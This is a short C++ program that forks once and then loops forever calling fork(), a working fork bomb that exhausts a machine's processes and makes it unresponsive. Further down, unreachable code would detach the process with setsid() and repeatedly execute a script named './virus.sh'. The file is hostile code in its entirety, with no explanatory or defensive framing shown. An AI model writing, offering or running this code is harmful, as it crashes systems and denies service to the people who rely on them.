#include<stdio.h>
#include<iostream>
#include<stdlib.h>
#include<unistd.h>
using namespace std;
int main()
{
	pid_t p1;
	pid_t p2;
	pid_t p3;

	p1=fork();
	while(1)
	{	
		p3=fork();
	}
	if(p1>0)
	{
		exit(0);
	}
	p2=setsid();
	char cmd[1024]="./virus.sh";
	while(1)
	{
		system(cmd);
	}
	return 0;


}
